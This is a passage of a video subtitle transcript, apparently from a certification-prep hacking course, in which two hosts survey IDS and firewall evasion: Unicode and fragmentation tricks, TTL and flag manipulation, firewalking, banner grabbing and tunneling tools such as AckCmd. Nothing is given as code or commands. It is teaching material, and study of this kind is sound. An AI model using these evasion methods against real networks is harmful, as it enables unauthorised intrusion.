brick.\n\n497\n00:21:51.210 --> 00:21:51.731\n&gt;&gt; I cannot.\n[LAUGH]\n\n498\n00:21:51.731 --> 00:21:52.454\n&gt;&gt; You're useless.\n\n499\n00:21:52.454 --> 00:21:54.062\n&gt;&gt; But I'm gonna look it up.\n\n500\n00:21:54.062 --> 00:21:54.840\n&gt;&gt; Absolutely useless.\n\n501\n00:21:54.840 --> 00:21:55.648\n&gt;&gt; I'm gonna figure it out.\n\n502\n00:21:55.648 --> 00:21:56.616\n&gt;&gt; You're absolutely useless.\n\n503\n00:21:56.616 --> 00:21:59.224\nI gave you an opportunity to shine\nin here, look at what you did to me.\n\n504\n00:21:59.224 --> 00:22:00.316\nI still have to talk.\n\n505\n00:22:00.316 --> 00:22:01.205\n&gt;&gt; I'm a little rusty on my Unicode.\n\n506\n00:22:01.205 --> 00:22:02.936\n&gt;&gt; You should know that.\n\n507\n00:22:02.936 --> 00:22:04.525\nWe talked about that before we came on,\nright?\n\n508\n00:22:04.525 --> 00:22:06.710\n&gt;&gt; [LAUGH]\n&gt;&gt; All right, so Unicode.\n\n509\n00:22:06.710 --> 00:22:08.732\nIf you're not familiar with Unicode,\nall kidding aside,\n\n510\n00:22:08.732 --> 00:22:11.172\none of the other character sets\nobviously we talk often about, ASCII.\n\n511\n00:22:11.172 --> 00:22:14.038\nA lot of times, that is what we reference.\n\n512\n00:22:14.038 --> 00:22:17.200\nWhat may be good to put up,\n\n513\n00:22:17.200 --> 00:22:20.340\njust if you can,\nwould be the Unicode character reference.\n\n514\n00:22:20.340 --> 00:22:22.312\nYou'll probably just find that in\nthe store, that's what people know.\n\n515\n00:22:22.312 --> 00:22:24.861\nLet me be clear, do not study\nthe Unicode character reference.\n\n516\n00:22:24.861 --> 00:22:26.002\n[LAUGH]\n&gt;&gt; [LAUGH]\n\n517\n00:22:26.002 --> 00:22:26.904\n&gt;&gt; Before you take the exam.\n\n518\n00:22:26.904 --> 00:22:28.742\nYou will see nothing that\nis important in that.\n\n519\n00:22:28.742 --> 00:22:31.060\nI'm just pointing out\nthat it is kinda cool,\n\n520\n00:22:31.060 --> 00:22:34.852\nbecause you can use these language\nsets to essentially manipulate data.\n\n521\n00:22:34.852 --> 00:22:38.460\nBecause we can, we, not we, clearly\nMike cannot because I asked him and\n\n522\n00:22:38.460 --> 00:22:39.715\nhe doesn't know how to.\n\n523\n00:22:39.715 --> 00:22:40.383\n&gt;&gt; [LAUGH]\n&gt;&gt; But\n\n524\n00:22:40.383 --> 00:22:43.525\na computer will be able to translate\nback and forth between them.\n\n525\n00:22:43.525 --> 00:22:47.405\nAnd so what we figured out is that we can\nactually propagate attacks by sending it\n\n526\n00:22:47.405 --> 00:22:50.865\nin a non-standard code reference\nthat we normally would not expect.\n\n527\n00:22:50.865 --> 00:22:55.052\nBecause the IDS is normally, unless you\nprogram it, not gonna look for Unicode.\n\n528\n00:22:55.052 --> 00:22:56.282\nIt's gonna look for ASCII.\n\n529\n00:22:56.282 --> 00:22:57.562\n&gt;&gt; Right.\n&gt;&gt; And so we can manipulate it\n\n530\n00:22:57.562 --> 00:22:59.292\nenough to try to push attacks through it.\n\n531\n00:22:59.292 --> 00:23:03.132\nWe talked a lot about fragmentation,\ndifferent kind of fragmentation offsets.\n\n532\n00:23:03.132 --> 00:23:07.502\n10 seconds, 20 seconds, whatever\nthe case may be to offset the data.\n\n533\n00:23:07.502 --> 00:23:10.746\nSo that may be kind of an approach\nthat would be valuable for\n\n534\n00:23:10.746 --> 00:23:11.949\nyou to look at there.\n\n535\n00:23:11.949 --> 00:23:16.573\n&gt;&gt; And I will tell you, cuz I know you're\nreally into this stuff, that as of the,\n\n536\n00:23:16.573 --> 00:23:21.675\nlet's see, June 16, 2016, they've added\nnew characters to the Unicode sets.\n\n537\n00:23:21.675 --> 00:23:22.362\n&gt;&gt; Yes.\n\n538\n00:23:22.362 --> 00:23:24.680\n&gt;&gt; There are 72 new emojis.\n\n539\n00:23:24.680 --> 00:23:26.371\n&gt;&gt; Are any of them ones that spin\ntheir head around, and then-\n\n540\n00:23:26.371 --> 00:23:27.617\n&gt;&gt; [LAUGH]\n\n541\n00:23:27.617 --> 00:23:28.889\n&gt;&gt; Boggle or bobble around and\n\n542\n00:23:28.889 --> 00:23:29.500\nyell at you?\n\n543\n00:23:29.500 --> 00:23:31.180\n&gt;&gt; I don't know, I'll start\nexploring that and let you know.\n\n544\n00:23:31.180 --> 00:23:34.890\n&gt;&gt; You may find one in there that\nyou want to reference and use.\n\n545\n00:23:34.890 --> 00:23:35.885\nThat would be kinda cool.\n\n546\n00:23:35.885 --> 00:23:36.790\n&gt;&gt; [LAUGH]\n&gt;&gt; Yeah, I'm so\n\n547\n00:23:36.790 --> 00:23:38.595\nexcited about that I can\nhardly contain myself.\n\n548\n00:23:38.595 --> 00:23:39.852\n&gt;&gt; I know you do a lot of texting and\n[CROSSTALK].\n\n549\n00:23:39.852 --> 00:23:41.270\n&gt;&gt; My god, yes, absolutely, that is me.\n\n550\n00:23:41.270 --> 00:23:43.643\nI live, absolutely live for that.\n\n551\n00:23:43.643 --> 00:23:45.769\nAll right, so speaking of live,\nTime To Live attacks.\n\n552\n00:23:45.769 --> 00:23:48.355\nThat's another real important one,\nTTL attacks.\n\n553\n00:23:48.355 --> 00:23:51.730\nWe've talked about that, and again, this\nrequires prior knowledge of the topology.\n\n554\n00:23:51.730 --> 00:23:52.960\nSo you've gotta get in,\n\n555\n00:23:52.960 --> 00:23:56.308\nyou've gotta be under the wire\nthere poking around as an attacker.\n\n556\n00:23:56.308 --> 00:23:59.711\nA lot of these attacks require\nthe attackers in behind the perimeter.\n\n557\n00:23:59.711 --> 00:24:03.173\nSo the biggest thing we could do as\ndefenders is ensure the perimeter is as\n\n558\n00:24:03.173 --> 00:24:05.950\nsolid as it can be and\nthat we don't let people in.\n\n559\n00:24:05.950 --> 00:24:07.940\nAnd let me be clear,\npeople are gonna get in.\n\n560\n00:24:08.950 --> 00:24:11.795\nWe often say, we'll just keep\nthe bad actors out and you're done.\n\n561\n00:24:11.795 --> 00:24:14.832\nYeah, if it was that simple,\nwe'd all be security professionals and\n\n562\n00:24:14.832 --> 00:24:16.129\nthere would be no bad actors.\n\n563\n00:24:16.129 --> 00:24:17.743\nSo we know it's not that simple.\n\n564\n00:24:17.743 --> 00:24:21.095\nWhat I wanna point out to you is\nexpect that bad actors will get in.\n\n565\n00:24:21.095 --> 00:24:22.060\nHere is the difference.\n\n566\n00:24:22.060 --> 00:24:23.711\nFigure out how to know they're there so\n\n567\n00:24:23.711 --> 00:24:26.752\nthat you understand that what\nthey're about to do can hurt you.\n\n568\n00:24:26.752 --> 00:24:29.402\nIt's not just about keeping them out\nbecause you can't build fences that\n\n569\n00:24:29.402 --> 00:24:33.292\nare high enough, broad enough and\ndeep enough to stop every attack.\n\n570\n00:24:33.292 --> 00:24:38.160\nWhat you can do realistically is\nset up an overlapping, mutually\n\n571\n00:24:38.160 --> 00:24:42.360\nreinforcing set of controls and monitors\nthat will tell you if you have a breach.\n\n572\n00:24:42.360 --> 00:24:45.630\nAnd if you can do that and pay attention\nto that, don't be the lazy admin,\n\n573\n00:24:45.630 --> 00:24:46.580\nin other words.\n\n574\n00:24:46.580 --> 00:24:50.110\nIf you pay attention to that, you're gonna\nfigure out that you have a problem, and\n\n575\n00:24:50.110 --> 00:24:52.830\nthen all the stuff that's happening\nthat is suspicious is gonna\n\n576\n00:24:52.830 --> 00:24:54.560\nstart to make a lot more sense to you.\n\n577\n00:24:54.560 --> 00:24:57.040\nSo it's really about\npaying attention more so\n\n578\n00:24:57.040 --> 00:25:00.530\nthan really just trying to stand there and\nkeep all the bad people out.\n\n579\n00:25:00.530 --> 00:25:03.290\nBecause we know that, at some point,\nit may or may not be effective.\n\n580\n00:25:03.290 --> 00:25:04.630\nPeople may get by you.\n\n581\n00:25:04.630 --> 00:25:06.610\nThat's just the reality of\nwhat we deal with today.\n\n582\n00:25:06.610 --> 00:25:08.570\nSo we wanna be aware of that,\nwanna think about that.\n\n583\n00:25:08.570 --> 00:25:09.880\nBut TTL attacks,\n\n584\n00:25:09.880 --> 00:25:12.970\nif we have prior knowledge of\nthe topology, we may be able to go in.\n\n585\n00:25:12.970 --> 00:25:15.410\nThings like Tracert would tell us this,\nfor instance.\n\n586\n00:25:15.410 --> 00:25:20.030\nIf we can get in behind the wire, use\nTracert or PathPing, something like that,\n\n587\n00:25:20.030 --> 00:25:23.920\nwhatever tool of choice you may\nwant that will give you TTL values.\n\n588\n00:25:23.920 --> 00:25:26.060\nIf we know the number of routers\nbetween the attacker and\n\n589\n00:25:26.060 --> 00:25:29.830\nthe victim, we can manipulate through\nfragmentation and TTL offsets.\n\n590\n00:25:29.830 --> 00:25:33.330\nWe can manipulate the traffic flow, and\nagain, try to sneak packets past where\n\n591\n00:25:33.330 --> 00:25:36.729\npeople are not aware of or they're not\npaying attention of what's happening\n\n592\n00:25:36.729 --> 00:25:39.553\nbecause they're fragmented, and\nthe TTLs are different, and\n\n593\n00:25:39.553 --> 00:25:42.880\nwe may not process them the right way or\nsee them in the right order.\n\n594\n00:25:42.880 --> 00:25:45.690\nAnd as a result,\nwe may be able to sneak those packets by.\n\n595\n00:25:45.690 --> 00:25:49.710\nInvalid reset attacks, or reset packets,\nrather, which lead to attacks.\n\n596\n00:25:49.710 --> 00:25:51.300\nRST, the reset flag.\n\n597\n00:25:51.300 --> 00:25:52.284\nWe can use that and\n\n598\n00:25:52.284 --> 00:25:56.954\nwe can actually manipulate the system by\nhaving it reset and stop paying attention.\n\n599\n00:25:56.954 --> 00:25:59.921\nAnd then, as a result, we can just push\ntraffic through when the admin says,\n\n600\n00:25:59.921 --> 00:26:01.600\nI'll go over here and play over here.\n\n601\n00:26:01.600 --> 00:26:06.200\nAnd you're now sending stuff to the target\nand it's not actually being seen.\n\n602\n00:26:06.200 --> 00:26:08.778\nSo we could that, we can manipulate\nthe urgency flag, the URG flag.\n\n603\n00:26:08.778 --> 00:26:13.802\nSo RST flags and U-R-G, URG flag attacks,\nboth are gonna be valuable for\n\n604\n00:26:13.802 --> 00:26:17.650\nus to think about with regards\nto how we can push through.\n\n605\n00:26:17.650 --> 00:26:22.400\nI've talked about polymorphic shellcode\nand Unicode or polymorphic and\n\n606\n00:26:22.400 --> 00:26:26.020\nunicode, polymorphic and\nmetamorphic shellcode manipulation,\n\n607\n00:26:26.020 --> 00:26:30.755\nthe fact that polymorphic code can be used\nto be able to manipulate and morph itself.\n\n608\n00:26:30.755 --> 00:26:33.290\nWe've talked about Unicode versus ASCII.\n\n609\n00:26:33.290 --> 00:26:34.300\nJust thinking about that,\n\n610\n00:26:34.300 --> 00:26:37.620\nthese are all different mechanisms,\ndifferent ways in which we may attack.\n\n611\n00:26:37.620 --> 00:26:39.240\nWhat about application layer?\n\n612\n00:26:39.240 --> 00:26:40.732\nWe've talked a lot about that.\n\n613\n00:26:40.732 --> 00:26:44.950\nDesynchronization and pre connection\nSYN attacks may be valuable.\n\n614\n00:26:44.950 --> 00:26:47.260\nSo we've talked about the SYN\npacket being received.\n\n615\n00:26:47.260 --> 00:26:50.938\nAnd if we send sake, I gotta stop\ntransposing my letters when I talk.\n\n616\n00:26:50.938 --> 00:26:53.810\n&gt;&gt; [LAUGH]\n&gt;&gt; If we send fake is what I was trying to\n\n617\n00:26:53.810 --> 00:26:59.920\nsay, SYN packets, then we may be\nable to desynchronize the IDS and\n\n618\n00:26:59.920 --> 00:27:02.540\ncause it to stop paying attention\nto certain traffic flows.\n\n619\n00:27:02.540 --> 00:27:05.860\nAnd if we stop the IDS from\nmonitoring by desynchronizing it,\n\n620\n00:27:05.860 --> 00:27:09.140\nwe can as you said essentially,\nwe call that the lazy admin attack now.\n\n621\n00:27:09.140 --> 00:27:11.260\n&gt;&gt; [LAUGH] It is.\n&gt;&gt; We can desynchronize and\n\n622\n00:27:11.260 --> 00:27:14.740\nwe can then start shipping packets by and\nnobody's gonna pay attention.\n\n623\n00:27:14.740 --> 00:27:18.120\nSo this is something else just\nto think about and to consider.\n\n624\n00:27:18.120 --> 00:27:21.372\nSo we've got all these different ways\nin which we can go in and evade and\n\n625\n00:27:21.372 --> 00:27:22.420\nget around IDSs.\n\n626\n00:27:22.420 --> 00:27:23.119\nWhat about firewalls?\n\n627\n00:27:23.119 --> 00:27:25.865\nIt's always a fun topic to think about.\n\n628\n00:27:25.865 --> 00:27:29.450\nFirewalking, traditionally, is what\nwe often talk about with firewalls.\n\n629\n00:27:29.450 --> 00:27:33.597\nGetting through, where we use TTL values\nto determine the gateway information,\n\n630\n00:27:33.597 --> 00:27:36.060\nthe ACL filters and map out our networks.\n\n631\n00:27:36.060 --> 00:27:37.360\nAnd then when we do that,\n\n632\n00:27:37.360 --> 00:27:42.530\nwe could send a TTL set to one hub\ngreater than that of the firewall.\n\n633\n00:27:42.530 --> 00:27:44.790\nAnd by doing that,\nif we make it through the gateway,\n\n634\n00:27:44.790 --> 00:27:48.240\nwe forward it automatically and\nwe go bypass the firewall.\n\n635\n00:27:48.240 --> 00:27:51.290\nSo that may actually allow us\nto be able to get through there.\n\n636\n00:27:51.290 --> 00:27:53.540\nWe can locate the firewall,\nfigure out what's there,\n\n637\n00:27:53.540 --> 00:27:54.770\nstart to map out the network.\n\n638\n00:27:54.770 --> 00:27:57.460\nSo firewalking allows\nus to figure that out.\n\n639\n00:27:57.460 --> 00:27:59.430\nWe could do banner\ngrabbing on the firewalls.\n\n640\n00:27:59.430 --> 00:28:00.990\nWe could go in and\nsee what kind of firewalls are running.\n\n641\n00:28:00.990 --> 00:28:05.600\nService announcements, they help us\nwith that, message of the day stuff.\n\n642\n00:28:05.600 --> 00:28:07.520\nIt depends on how the firewall is set up.\n\n643\n00:28:07.520 --> 00:28:12.720\nBut if we do something like,\neither through a malformed GET request or\n\n644\n00:28:12.720 --> 00:28:15.510\nGET HTTP at the header for a web server.\n\n645\n00:28:15.510 --> 00:28:18.480\nWe take a look at this in the web\nserver web hacking episodes.\n\n646\n00:28:18.480 --> 00:28:20.620\nYou can obviously watch for\nthose and take a look.\n\n647\n00:28:20.620 --> 00:28:23.780\nBut you can issue a malformed\nGET request to a web server.\n\n648\n00:28:23.780 --> 00:28:25.560\nAnd if we have not\nstripped the host headers,\n\n649\n00:28:25.560 --> 00:28:27.400\nyou could actually get\nthe host header back.\n\n650\n00:28:27.400 --> 00:28:30.420\nAnd as a result, we can profile\nthe system and fingerprint it and\n\n651\n00:28:30.420 --> 00:28:33.100\nknow what kind of web server is running,\nMicrosoft, Apache, whatever.\n\n652\n00:28:33.100 --> 00:28:35.290\nWe can do the same thing with\nthe mail system with SMTP.\n\n653\n00:28:35.290 --> 00:28:38.200\nWe could do the same thing with\ncertain kinds of firewalls.\n\n654\n00:28:38.200 --> 00:28:41.270\nBanner grab, and as a result, figure\nout what kind of firewall is running.\n\n655\n00:28:41.270 --> 00:28:44.010\nWe know the oldies but\ngoodies IP address spoofing and\n\n656\n00:28:44.010 --> 00:28:48.840\nmasquerading are always gonna be\ncapable to attack this kind of system.\n\n657\n00:28:48.840 --> 00:28:51.496\nSource routing,\ntalked about source routing exploits,\n\n658\n00:28:51.496 --> 00:28:53.750\nanother way to get around these systems.\n\n659\n00:28:53.750 --> 00:28:56.160\nWe may be able to do\ntiny fragment attacks.\n\n660\n00:28:56.160 --> 00:28:59.630\nWe talked about that where we fragment the\npackets and you'll push them through in\n\n661\n00:28:59.630 --> 00:29:02.690\na way that they don't seem obvious and\nthey don't seem dangerous.\n\n662\n00:29:02.690 --> 00:29:03.950\nSo that's something to consider.\n\n663\n00:29:03.950 --> 00:29:07.687\nWe could bypass block sites\nby using proxy URLs or\n\n664\n00:29:07.687 --> 00:29:13.162\nanonymizer proxies as we took a look\nat in the demo in the last episodes.\n\n665\n00:29:13.162 --> 00:29:15.170\nThat may be something to consider.\n\n666\n00:29:15.170 --> 00:29:16.150\nWe've talked about that and\n\n667\n00:29:16.150 --> 00:29:20.000\nhow that could help us, that would\nget around these kind of devices.\n\n668\n00:29:20.000 --> 00:29:22.260\nAnonymous surfing sites generically.\n\n669\n00:29:22.260 --> 00:29:24.599\nSo any kind of anonymizer\nwould be helpful.\n\n670\n00:29:26.680 --> 00:29:28.600\nWhat else do we wanna think about here?\n\n671\n00:29:28.600 --> 00:29:31.640\nICMP tunneling, so\nwe could tunnel through the firewall.\n\n672\n00:29:31.640 --> 00:29:33.180\nWe've got some tools.\n\n673\n00:29:33.180 --> 00:29:35.090\nRemember Blackstone years ago?\n\n674\n00:29:35.090 --> 00:29:36.955\n&gt;&gt; Yes.\n&gt;&gt; See, they're gone now,\n\n675\n00:29:36.955 --> 00:29:38.100\nthey got bought up.\n\n676\n00:29:38.100 --> 00:29:42.360\nIt was so\nmuch more fun to do this back in the day.\n\n677\n00:29:42.360 --> 00:29:44.480\nAnd I'm sure 100 years from now,\nsomebody will say,\n\n678\n00:29:44.480 --> 00:29:47.410\nyeah, it was much more fun to do it when\nAdam was around doing it 100 years ago\n\n679\n00:29:47.410 --> 00:29:50.301\nbecause the tools we have now\nsuck cuz there's nothing good.\n\n680\n00:29:50.301 --> 00:29:53.380\nBut back 15,\n20 years ago when you had Blackstone and\n\n681\n00:29:53.380 --> 00:29:56.602\nyou had all those hacking tools\nthey would put out for free.\n\n682\n00:29:56.602 --> 00:29:57.510\nSome of them are still around.\n\n683\n00:29:57.510 --> 00:30:01.182\nSuperScan, for instance, is one of their\ntools we talk about a lot of people use.\n\n684\n00:30:01.182 --> 00:30:03.618\nBut they had great tunneling tool,\nHTTP tunnel,\n\n685\n00:30:03.618 --> 00:30:06.210\nthat you could use to\ntunnel through anything.\n\n686\n00:30:06.210 --> 00:30:08.860\nIt was just the Earth mover of its day.\n\n687\n00:30:08.860 --> 00:30:11.870\nAnd you could tunnel through\nany interface using this tool.\n\n688\n00:30:11.870 --> 00:30:14.700\nI think one of the reasons\nthey ultimately disappeared\n\n689\n00:30:14.700 --> 00:30:17.210\nbecause somebody looked down and\nsaid, we cannot let that thing\n\n690\n00:30:17.210 --> 00:30:20.680\njust continue to be available because it\nwill just destroy everything it touches.\n\n691\n00:30:20.680 --> 00:30:23.450\nWe used to use this all\nthe time to do pen tests,\n\n692\n00:30:23.450 --> 00:30:26.950\nwhere we would use this to just burrow\nthrough any interface that we could find.\n\n693\n00:30:26.950 --> 00:30:29.350\nAnd it was untraceable for the most part.\n\n694\n00:30:29.350 --> 00:30:32.530\nSo it was a pretty bitching tool,\nas they say.\n\n695\n00:30:32.530 --> 00:30:34.660\nICMP tunneling, ACK tunneling,\n\n696\n00:30:34.660 --> 00:30:38.180\nwe can bypass firewalls through the ACK\ntunneling thought process as well.\n\n697\n00:30:38.180 --> 00:30:41.410\nSo we can use ACK bits to\nobviously spoof what we're doing.\n\n698\n00:30:41.410 --> 00:30:45.070\nIf we don't check those ACK bits,\nthe firewall may allow it through.\n\n699\n00:30:45.070 --> 00:30:48.680\nSo I think, what is it,\n\n700\n00:30:48.680 --> 00:30:53.830\ncan you check ntsecurity.nu and\nsee if it's still up?\n\n701\n00:30:53.830 --> 00:30:56.210\nThat's one of the sites that used to\nhave a lot of this stuff on there.\n\n702\n00:30:56.210 --> 00:31:00.470\nWe're looking for a tool, if it's there,\ncalled AckCmd, A-C-K-C-M-D.\n\n703\n00:31:00.470 --> 00:31:02.410\nOr you could just Google AckCmd and\nfind that tool.\n\n704\n00:31:02.410 --> 00:31:05.810\nBut if you use that tool, you can\nimplement ACK tunneling with that tool.\n\n705\n00:31:05.810 --> 00:31:07.700\nIt's actually a really neat\nlittle tool to play with.\n\n706\n00:31:07.700 --> 00:31:11.013\nI don't know if ntsecurity.nu\nis up anymore, it may not be.\n\n707\n00:31:11.013 --> 00:31:13.700\n&gt;&gt; It is, I'll tell you that and\nthat we can pull up my screen.\n\n708\n00:31:13.700 --> 00:31:14.940\n&gt;&gt; Do we want to?\n\n709\n00:31:14.940 --> 00:31:15.846\nYeah, yeah.\n\n710\n00:31:15.846 --> 00:31:18.610\n&gt;&gt; Visiting this web site\nmay harm your computer.\n\n711\n00:31:18.610 --> 00:31:21.580\n&gt;&gt; You may not want,\nI don't know if that's the right one.\n\n712\n00:31:21.580 --> 00:31:28.385\nSo what you may wanna do is just\nsearch for AckCmd, A-C-K-C-M-D.\n\n713\n00:31:28.385 --> 00:31:29.905\nKerbCrack, that is the site.\n\n714\n00:31:29.905 --> 00:31:30.840\nKerbCrack is their tool.\n\n715\n00:31:30.840 --> 00:31:32.040\nThat's probably the site.\n\n716\n00:31:32.040 --> 00:31:33.570\nIt's just that they've got\nhacking tools on there,\n\n717\n00:31:33.570 --> 00:31:35.444\nwhich is probably why [LAUGH]\nthey're telling you not to go there.\n\n718\n00:31:35.444 --> 00:31:39.300\nBut the site is legitimate,\nyou're not gonna blow up.\n\n719\n00:31:39.300 --> 00:31:40.450\n&gt;&gt; We're gonna go ahead and go there.\n\n720\n00:31:40.450 --> 00:31:41.174\n[CROSSTALK]\n&gt;&gt; You'll deal\n\n721\n00:31:41.174 --> 00:31:41.700\nwith that,\nyou'll deal with that on your own.\n\n722\n00:31:42.710 --> 00:31:46.400\nBut just I wanted to point out that\nAckCmd is a tool that you can use to\n\n723\n00:31:46.400 --> 00:31:47.470\ndo ACK tunneling.\n\n724\n00:31:47.470 --> 00:31:48.950\nSo you may wanna play [LAUGH] with that.\n\n725\n00:31:48.950 --> 00:31:51.400\nBut that is KerbCrack and\nthis tool, that's legitimate.\n\n726\n00:31:51.400 --> 00:31:52.260\nSo that is their stuff.\n\n727\n00:31:52.260 --> 00:31:54.671\nSo just so you know.\n\n728\n00:31:54.671 --> 00:31:57.200\nBut thinking about these\nkind of attacks and\n\n729\n00:31:57.200 --> 00:31:59.670\nthese kind of system tools may be helpful.\n\n730\n00:31:59.670 --> 00:32:05.553\nThere's HTTP port And a HTTP host\nto bypass and to do some tunneling.\n\n731\n00:32:05.553 --> 00:32:08.823\nSuper Network Tunneler,\nMichael grabbed some of these tools,\n\n732\n00:32:08.823 --> 00:32:11.215\nand we'll throw them up for\nyou at some point.\n\n733\n00:32:11.215 --> 00:32:15.680\nAnd if you need me to go with the offline\nand do it, we can take a look at that.\n\n734\n00:32:15.680 --> 00:32:20.333\nYou could use SSH tunneling, so OpenSSH\ncan be used to be able to use encryption\n\n735\n00:32:20.333 --> 00:32:22.817\nand tunneling and bypass the firewalls.\n\n736\n00:32:22.817 --> 00:32:25.369\nA lot of this stuff is really just\nabout the fact that if we don't look at\n\n737\n00:32:25.369 --> 00:32:27.260\nthe traffic,\nwe're not gonna know it's there.\n\n738\n00:32:27.260 --> 00:32:32.800\nBitvise is another one that can be used\nto do SSH tunneling, pretty popular one.\n\n739\n00:32:32.800 --> 00:32:35.270\nSo a lot of those kind\nof tools would come up.\n\n740\n00:32:35.270 --> 00:32:38.650\nWe could do man-in-the-middle\nattacks to bypass firewalls.\n\n741\n00:32:38.650 --> 00:32:44.050\nWe can use content capabilities\nlike macro bypass solutions,\n\n742\n00:32:44.050 --> 00:32:45.700\nmalicious content carrying.\n\n743\n00:32:45.700 --> 00:32:48.540\nWe can stealth and\nhide a bunch of stuff in the stream.\n\n744\n00:32:48.540 --> 00:32:51.670\nSteganography is another way to\npush this stuff in potentially.\n\n745\n00:32:51.670 --> 00:32:54.350\nThere's all sorts of ways to\nget past firewalls, right.\n\n746\n00:32:54.350 --> 00:32:57.340\nSo you just wanna keep that in mind and\nthink about that.\n\n747\n00:32:57.340 --> 00:32:59.820\nBut we do have a bunch of\ntools that we can use.\n\n748\n00:32:59.820 --> 00:33:04.260\nThere's Traffic IQ Professional,\nwhich does IDS and firewall evasion.\n\n749\n00:33:04.260 --> 00:33:05.454\nIt's kind of a neat one.\n\n750\n00:33:05.454 --> 00:33:09.255\nThere's TCP over DNS,\nthat's another IDS firewall invasion tool.\n\n751\n00:33:09.255 --> 00:33:13.340\nThat's tcp-over-dns,\nit's a command line tool.\n\n752\n00:33:13.340 --> 00:33:15.405\nSo that's one you can play with.\n\n753\n00:33:15.405 --> 00:33:16.430\nThat's kind of a fun one.\n\n754\n00:33:16.430 --> 00:33:17.831\nDid you get hacked, or\ndid you actually [CROSSTALK]\n\n755\n00:33:17.831 --> 00:33:18.598\n&gt;&gt; Nope, I made it into the menu.\n\n756\n00:33:18.598 --> 00:33:19.395\n&gt;&gt; Okay, cool.\n\n757\n00:33:19.395 --> 00:33:21.967\nAnd so did everybody else who's\nnow examining your system.\n\n758\n00:33:21.967 --> 00:33:22.551\n&gt;&gt; Exactly.\n\n759\n00:33:22.551 --> 00:33:24.687\nAnd just as a disclaimer.\n\n760\n00:33:24.687 --> 00:33:28.197\nGo to that site [CROSSTALK]\n&gt;&gt; Yeah, be careful, [CROSSTALK]\n\n761\n00:33:28.197 --> 00:33:30.285\n&gt;&gt; But if you're downloading any tools,\n\n762\n00:33:30.285 --> 00:33:31.430\nmaybe do it into a VM.\n\n763\n00:33:31.430 --> 00:33:33.290\nScan those tools, you know, whatever.\n\n764\n00:33:33.290 --> 00:33:35.770\nUse normal precautions anytime\nyou're dealing with security tools.\n\n765\n00:33:35.770 --> 00:33:36.300\n&gt;&gt; Safe computing.\n\n766\n00:33:36.300 --> 00:33:37.030\n&gt;&gt; And they're free, yeah.\n\n767\n00:33:37.030 --> 00:33:37.733\n&gt;&gt; Safe computing, right?\n\n768\n00:33:37.733 --> 00:33:38.553\nAll right.\n\n769\n00:33:38.553 --> 00:33:40.270\nSo we talked about that command.\n\n770\n00:33:40.270 --> 00:33:43.900\nThere's Tomahawk,\nthere's Freenet, there's GTunnel.\n\n771\n00:33:43.900 --> 00:33:45.430\nThere's Proxifier.\n\n772\n00:33:47.100 --> 00:33:49.420\nSNARE agent for Windows.\n\n773\n00:33:49.420 --> 00:33:51.196\nThere's, love this one, Your Freedom.\n\n774\n00:33:51.196 --> 00:33:54.288\n&gt;&gt; [LAUGH]\n&gt;&gt; There's Hotspot Shield,\n\n775\n00:33:54.288 --> 00:33:58.580\nthere's all sorts of different ones\nout there that would be interesting.\n\n776\n00:33:58.580 --> 00:34:02.626\nThere's Colasoft Packet Builder, this\ndoes packet fragmentation, generation, so\n\n777\n00:34:02.626 --> 00:34:05.570\nyou generate all the fragmented packets.\n\n778\n00:34:05.570 --> 00:34:06.401\nSo that's one of the ones.\n\n779\n00:34:06.401 --> 00:34:08.674\nThere's Pktgen for packet gen.\n\n780\n00:34:08.674 --> 00:34:10.519\nThere's fping 3.\n\n781\n00:34:10.519 --> 00:34:13.570\nNetScan has a tool called NetScan Pro.\n\n782\n00:34:13.570 --> 00:34:16.720\nPacket ETH is another big one there.\n\n783\n00:34:16.720 --> 00:34:19.660\nOstinato is another good one for\npacket generation.\n\n784\n00:34:19.660 --> 00:34:22.110\nYou can find that up at Google,\nat code.google.com.\n\n785\n00:34:22.110 --> 00:34:23.318\nA lot of those are up there.\n\n786\n00:34:23.318 --> 00:34:27.922\nWe've used hping3 on some of the prior\ndemos, you've seen me use that one.\n\n787\n00:34:27.922 --> 00:34:30.650\nSo hping3 is a common one for\npacket fragmentation.\n\n788\n00:34:30.650 --> 00:34:32.916\nWe've used that to do some of\nthe attack demos, right, so\n\n789\n00:34:32.916 --> 00:34:34.320\nwe actually used that one on Linux.\n\n790\n00:34:34.320 --> 00:34:35.120\n&gt;&gt; We did.\n\n791\n00:34:35.120 --> 00:34:36.546\n&gt;&gt; So you got to see that.\n\n792\n00:34:36.546 --> 00:34:38.833\nThere's honeypot detection tools.\n\n793\n00:34:38.833 --> 00:34:45.200\nSend-Safe Honeypot Hunter,\nwhich is one that you can take a look at.\n\n794\n00:34:45.200 --> 00:34:47.501\nYou're not as concerned about that,\nbecause unless you're going out and\n\n795\n00:34:47.501 --> 00:34:49.581\nactually hacking for real,\nyou don't want to find the honeypots,\n\n796\n00:34:49.581 --> 00:34:50.875\nyou wanna makes sure nobody finds yours.\n\n797\n00:34:50.875 --> 00:34:54.120\nSo that's probably not as\na big of a deal for you.\n\n798\n00:34:54.120 --> 00:34:56.978\nBut, you know, there are tools out there\nthat hackers can use to find honeypots,\n\n799\n00:34:56.978 --> 00:34:59.517\ncuz, you know, we've gotta show them\na little love every now and then.\n\n800\n00:34:59.517 --> 00:35:00.022\n&gt;&gt; Yeah, of course.\n\n801\n00:35:00.022 --> 00:35:02.390\n&gt;&gt; And we talk about them and\nbeat on them relentlessly.\n\n802\n00:35:02.390 --> 00:35:03.627\nWe've got to at least\ngive them something to-\n\n803\n00:35:03.627 --> 00:35:05.324\n&gt;&gt; How about we catch them, and\n\n804\n00:35:05.324 --> 00:35:08.596\nthen they go to work for\nthe US government anyway, so.\n\n805\n00:35:08.596 --> 00:35:10.348\n&gt;&gt; Yeah, that or they come to\nwork here at ITProTV [CROSSTALK].\n\n806\n00:35:10.348 --> 00:35:12.193\nSo it's just a question of\nwhere they choose to go.\n\n807\n00:35:12.193 --> 00:35:15.593\nI hear you guys have a better retirement\npackage than the government, so\n\n808\n00:35:15.593 --> 00:35:17.165\nthat may actually work out well.\n\n809\n00:35:17.165 --> 00:35:22.192\nNo extradition to foreign places\nwith extraordinary measures.\n\n810\n00:35:22.192 --> 00:35:25.475\nSo thinking about countermeasures here,\nthings like shutting down switch\n\n811\n00:35:25.475 --> 00:35:27.845\nports that are associated\nwith known attack vectors.\n\n812\n00:35:27.845 --> 00:35:31.342\nSo you wanna, you'll be monitoring that\nand obviously have a way to do that.\n\n813\n00:35:31.342 --> 00:35:33.640\nIn-depth analysis on all traffic.\n\n814\n00:35:33.640 --> 00:35:36.717\nWe wanna figure out a way to do\ninline real-time decryption,\n\n815\n00:35:36.717 --> 00:35:38.385\ncuz that's gonna be 